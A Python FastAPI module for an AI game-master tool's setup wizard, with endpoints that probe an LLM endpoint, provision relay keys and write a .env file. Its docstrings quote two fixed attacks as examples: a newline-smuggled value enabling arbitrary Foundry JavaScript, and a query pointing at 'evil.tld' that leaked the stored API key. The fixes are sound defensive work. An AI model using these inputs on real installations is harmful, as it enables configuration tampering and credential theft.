"""First-run wizard: setup endpoints for LLM, relay, and .env provisioning."""

import logging
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel, ConfigDict, Field, field_validator

from api.deps import AppState, ErrorResponse, get_app_state
from config import settings

logger = logging.getLogger("ai-gm")

router = APIRouter(prefix="/api/setup", tags=["setup"])


class LLMModel(BaseModel):
    """LLM model info."""
    id: str
    name: str
    owned_by: Optional[str] = None
    created: Optional[int] = None


class ModelsResponse(BaseModel):
    """List of available LLM models."""
    models: list[LLMModel]
    endpoint: str


class PairingCodeResponse(BaseModel):
    """Pairing code and Foundry module field info."""
    code: str
    foundry_module_field: str
    dashboard_url: str
    instructions: str


class SetupEnvRequest(BaseModel):
    """First-run wizard values written into .env.

    Values are interpolated into `KEY=value` lines, so a newline in one of them
    injects further settings: a model of "x\nALLOW_EXECUTE_JS=true" used to turn
    on arbitrary Foundry JS on the next start. This was the only route in the
    tree taking a raw dict body.
    """

    llm_api_key: str = Field("", max_length=512)
    llm_base_url: str = Field("http://localhost:8800/v1", max_length=2048)
    model: str = Field("", max_length=256)
    campaign_vault_path: str = Field("~/Vaults/MyStuff/Dungeons_and_Dragons", max_length=4096)
    ai_name: str = Field("Sage", max_length=128)
    ai_tone: str = Field("mysterious, immersive, high fantasy", max_length=512)

    model_config = ConfigDict(extra="forbid")

    @field_validator("*")
    @classmethod
    def _reject_line_breaks(cls, v: str) -> str:
        if any(c in v for c in "\r\n\x00"):
            raise ValueError("value may not contain a line break or null byte")
        return v


class ProbeResponse(BaseModel):
    """LLM endpoint probe result."""
    healthy: bool
    message: str
    models: Optional[list[LLMModel]] = None
    endpoint: str


@router.get("/status")
async def setup_status(state: AppState = Depends(get_app_state)):
    """Check if setup is complete (all required config is set)."""
    checks = {
        "llm_api_key": bool(settings.llm_api_key),
        "model": bool(settings.model),
        "relay_managed": settings.relay_managed,
        "relay_api_key": bool(settings.relay_api_key),
        "relay_scoped_key": bool(settings.relay_scoped_key),
    }
    all_set = all(checks.values())
    return {
        "complete": all_set,
        "checks": checks,
        "message": "Setup complete" if all_set else "Setup incomplete — see checks",
    }


@router.post("/probe-llm")
async def probe_llm(
    base_url: Optional[str] = None,
    api_key: Optional[str] = None,
    state: AppState = Depends(get_app_state),
) -> ProbeResponse:
    """Probe an LLM endpoint and list available models.

    Omit base_url and api_key to probe the configured endpoint. Supplying
    base_url requires supplying api_key with it: the stored LLM_API_KEY is
    never sent to a caller-chosen host.

    Both parameters are scalars with defaults, so FastAPI binds them as query
    params and a POST here needs no body. That makes it a CORS simple request
    with no preflight, so any page the operator visits can fire it. Before the
    api_key requirement below, `?base_url=https://evil.tld` mailed the stored
    key to that host in an Authorization header; cors_origins only hid the
    response, which the attacker's own server did not need.
    """
    url = (base_url or settings.llm_base_url).rstrip("/")

    if base_url:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            raise HTTPException(
                status_code=400,
                detail="base_url must be http:// or https://",
            )
        if not parsed.hostname or parsed.username or parsed.password:
            raise HTTPException(
                status_code=400,
                detail="base_url must be a plain host URL with no embedded credentials",
            )
        if not api_key:
            raise HTTPException(
                status_code=400,
                detail=(
                    "api_key is required when base_url is supplied — the stored "
                    "LLM_API_KEY is never forwarded to a caller-chosen host"
                ),
            )
        key = api_key
    else:
        key = api_key or settings.llm_api_key

    models_endpoint = f"{url}/models"

    if not key:
        return ProbeResponse(
            healthy=False,
            message="No LLM API key provided",
            endpoint=url,
        )

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get(
                models_endpoint,
                headers={"Authorization": f"Bearer {key}"},
            )
            resp.raise_for_status()
            data = resp.json()

            # Handle both OpenAI-style { data: [...] } and direct [...]
            models_list = data.get("data", data) if isinstance(data, dict) else data
            models = [
                LLMModel(
                    id=m.get("id", ""),
                    name=m.get("name", m.get("id", "unknown")),
                    owned_by=m.get("owned_by"),
                    created=m.get("created"),
                )
                for m in models_list
                if isinstance(m, dict)
            ]

            return ProbeResponse(
                healthy=True,
                message=f"Found {len(models)} model(s)",
                models=models,
                endpoint=url,
            )
    except httpx.HTTPError as e:
        return ProbeResponse(
            healthy=False,
            message=f"HTTP error: {e}",
            endpoint=url,
        )
    except Exception as e:
        logger.error(f"Failed to probe LLM: {e}")
        return ProbeResponse(
            healthy=False,
            message=str(e),
            endpoint=url,
        )


@router.post("/provision-relay-scoped-key")
async def provision_relay_scoped_key(
    client_id: Optional[str] = None,
    state: AppState = Depends(get_app_state),
):
    """Provision a scoped API key for REST calls.

    This must be called AFTER the relay is running and the master key is set.
    client_id (optional) binds the key to a specific Foundry client.
    """
    if not state.relay_manager:
        raise HTTPException(status_code=503, detail="Relay manager not initialized")

    if not settings.relay_api_key:
        raise HTTPException(
            status_code=400,
            detail="Master API key not set — start relay first",
        )

    try:
        await state.relay_manager.ensure_rest_scoped_key(client_id=client_id)
        if not settings.relay_scoped_key:
            return JSONResponse(
                status_code=500,
                content=ErrorResponse(
                    status="error",
                    error="Scoped key creation failed",
                    code="SCOPED_KEY_FAILED",
                ).model_dump(),
            )
        return {
            "status": "ok",
            "message": "Relay scoped key provisioned",
            "key_set": bool(settings.relay_scoped_key),
        }
    except Exception as e:
        logger.error(f"Failed to provision scoped key: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/pairing-code")
async def get_pairing_code(state: AppState = Depends(get_app_state)) -> PairingCodeResponse:
    """Get the current relay pairing code.

    The code is displayed in the relay dashboard and must be entered in the
    Foundry module settings to pair the world with this AI GM instance.
    """
    if not state.relay_manager:
        raise HTTPException(status_code=503, detail="Relay manager not initialized")

    try:
        creds = state.relay_manager._load_credentials()
        dashboard_url = state.relay_manager.dashboard_url

        return PairingCodeResponse(
            code=creds.get("api_key", ""),
            foundry_module_field="aigm-config.pairingCode",
            dashboard_url=dashboard_url,
            instructions=(
                f"1. Open {dashboard_url} in your browser\n"
                f"2. Log in with: {creds.get('email', 'aigm@local.host')}\n"
                f"3. Copy the pairing code above and paste it into Foundry:\n"
                f"   Settings > Modules > AI Gamemaster > Pairing Code\n"
                f"4. Save and reload the world"
            ),
        )
    except Exception as e:
        logger.error(f"Failed to get pairing code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/write-env")
async def write_env(
    config: SetupEnvRequest,
    state: AppState = Depends(get_app_state),
):
    """Write .env file from setup wizard configuration.

    config should contain:
    - llm_api_key: LLM API key
    - llm_base_url: LLM endpoint URL (default: http://localhost:8800/v1)
    - model: Model ID to use
    - campaign_vault_path: Path to campaign vault (default: ~/Vaults/MyStuff/Dungeons_and_Dragons)
    - ai_name: AI character name (default: Sage)
    - ai_tone: AI personality tone
    """
    try:
        env_path = Path(".env")
        if env_path.exists():
            # Backup existing
            backup_path = Path(f".env.bak.{int(__import__('time').time())}")
            env_path.rename(backup_path)
            logger.info(f"Backed up existing .env to {backup_path}")

        # Build .env content with validated values
        env_lines = [
            "# Auto-generated by first-run setup wizard",
            "",
            f"LLM_API_KEY={config.llm_api_key}",
            f"LLM_BASE_URL={config.llm_base_url}",
            f"MODEL={config.model}",
            "",
            "# FoundryVTT Relay",
            "RELAY_MANAGED=true",
            "RELAY_URL=http://localhost:13010",
            "RELAY_WS_URL=ws://localhost:13010/ws/api",
            "# Leave relay credentials empty — auto-provisioned on first run",
            "RELAY_ADMIN_EMAIL=aigm@local.host",
            "RELAY_ADMIN_PASSWORD=",
            "",
            "# Campaign Data",
            f"CAMPAIGN_VAULT_PATH={config.campaign_vault_path}",
            "",
            "# AI Customization",
            f"AI_NAME={config.ai_name}",
            f"AI_TONE={config.ai_tone}",
            "",
            "# Admin Panel",
            "ADMIN_PORT=18080",
            "ADMIN_HOST=127.0.0.1",
            "",
        ]

        env_path.write_text("\n".join(env_lines))
        logger.info(f"Wrote .env file: {env_path.resolve()}")

        return {
            "status": "ok",
            "message": f".env written to {env_path.resolve()}",
            "path": str(env_path.resolve()),
        }
    except Exception as e:
        logger.error(f"Failed to write .env: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/start-wizard")
async def start_wizard(state: AppState = Depends(get_app_state)):
    """Initialize the setup wizard (ensure relay is starting, etc.)."""
    try:
        if not state.relay_manager.status()["running"]:
            await state.relay_manager.start(start_foundry=False)
            logger.info("Relay started for setup wizard")
        return {
            "status": "ok",
            "relay_running": state.relay_manager.status()["running"],
            "dashboard_url": state.relay_manager.dashboard_url,
        }
    except Exception as e:
        logger.error(f"Failed to start setup wizard: {e}")
        raise HTTPException(status_code=500, detail=str(e))
